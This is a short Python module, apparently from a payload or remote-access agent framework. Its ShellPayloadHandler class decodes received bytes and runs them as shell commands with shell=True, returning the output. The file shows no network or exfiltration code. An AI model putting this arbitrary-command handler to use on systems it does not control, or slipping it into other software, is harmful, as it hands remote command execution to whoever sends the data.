import subprocess
from payloads.absract_payload_handler import AbstractPayloadHandler

class ShellPayloadHandler(AbstractPayloadHandler):
    
    @classmethod
    def get_platform(cls):
        return "cross_platform"

    def execute_payload(self, data:bytes) ->str:
        try:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            return output_bytes.decode("utf-8", errors="replace")
        except Exception as e:
            return "Command execution unsuccessful: %s\n" %str(e)

